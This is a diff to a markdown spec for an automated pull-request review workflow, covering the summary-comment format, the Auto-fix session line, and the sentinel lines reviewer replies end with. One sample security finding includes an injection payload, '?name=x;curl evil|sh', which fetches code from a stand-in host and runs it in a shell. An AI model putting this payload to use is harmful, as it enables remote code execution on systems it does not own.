@@ -647,7 +647,11 @@ The `/finalize-pr` report carries no code-review, AI-debris or spec-drift sectio
 `/review-pr` posts one issue comment per run, never edits an earlier one, and is the only skill that
 marks a PR ready. The first line, the `Head:`, `Scope:`, `Criteria:`, `Reviewer:`, `Security:`,
 `Copilot:` and `Auto-fix:` lines, and the `###` headings are read by machines; keep their spelling. `merge-gate.py` reads the
-first line, `Head:` and `Auto-fix:` to decide whether a head was reviewed and which session to stop.
+first line, `Head:` and `Auto-fix:` to decide whether a head was reviewed and which session to stop,
+and counts the `Draft` summaries since the newest `Ready` one as the PR's review rounds.
+`/review-round` reads `### Blocking findings` as the whole of what the next round fixes, so every
+blocking finding sits on its own line there with its `path:line`. `review-pr.py` writes the comment;
+nothing composes it by hand.
 
 ```markdown
 ## /review-pr — {Ready | Draft}
@@ -660,7 +664,7 @@ Criteria: {proven on this head by /finalize-pr: {V} verified, {W} weak, {M} manu
 Reviewer: `{the project agent's frontmatter name, or code-review}` — {approved | changes_requested}, {C} Critical, {H} High
 Security: `{vendor} ({model})` — {H} High, {M} Medium, {L} Low
 Copilot: {requested by the repository's ruleset | requested by /review-pr | did not run: {why} | not requested: Draft}{; later passes: on push | ; later passes: none, the repository does not review on push}
-Auto-fix: {[session_…](https://claude.ai/code/session_…) — {started | already watching} | not started: {why} | not started: Draft}
+Auto-fix: {[session_…](https://claude.ai/code/session_…) — {started | already watching | reuse unconfirmed: {why}; no new session started} | not started: {why} | not started: Draft}
 
 ### Criteria
 {only when /finalize-pr handed off on this head: its report, unchanged, from its first line after the
@@ -703,6 +707,38 @@ reviews a PR only once it is ready, and the Auto-fix session answers it after th
 posted. A later push needs a later summary: an earlier `Ready` says nothing about a commit it did
 not see, and `/merge-pr` and `/merge-stack` refuse a head the latest summary does not name. That is
 what stops an Auto-fix session's commits merging without the code and security reviews.
+
+## The reviewer reports
+
+`/review-pr`'s two reviewers reply in prose, and end their reply with lines `review-pr.py` reads.
+The prompts that ask for them are `references/code-review-prompt.md` and
+`references/security-review-prompt.md`; the session writes each reply, unchanged, to the file the
+run's manifest names, and the summary carries each in full in its closing `<details>` block.
+
+```text
+spec-drift: #60 | earn rate changes from 1 to 2 points | src/cart/summary.ts:12
+FINDING: High | src/auth/client.ts:88 | the token is logged in plain text
+FINDING: Low | src/util.ts:3 | a tautological comment
+
+VERDICT: changes_requested
+CRITICAL_COUNT: 0
+HIGH_COUNT: 1
+```
+
+```text
+FINDING: High | api/export.py:41 | the name reaches a shell; exploit: `?name=x;curl evil|sh`
+
+SECURITY_HIGH: 1
+SECURITY_MEDIUM: 0
+SECURITY_LOW: 0
+```
+
+The sentinels decide whether a reply is a result at all: a reply without all of its sentinels is no
+review, and the run stops or the security chain moves on. The counts decide the verdict, and a code
+report that says `approved` beside a non-zero count is read by its count. The `FINDING:` lines fill
+the summary's finding lists; a blocking count with no `FINDING:` line still puts a line under
+`### Blocking findings` that sends the reader to the full report, so a blocking summary never says
+`None.` there. `spec-drift:` lines are advisory and never count.
 
 ## The Auto-fix comment
 
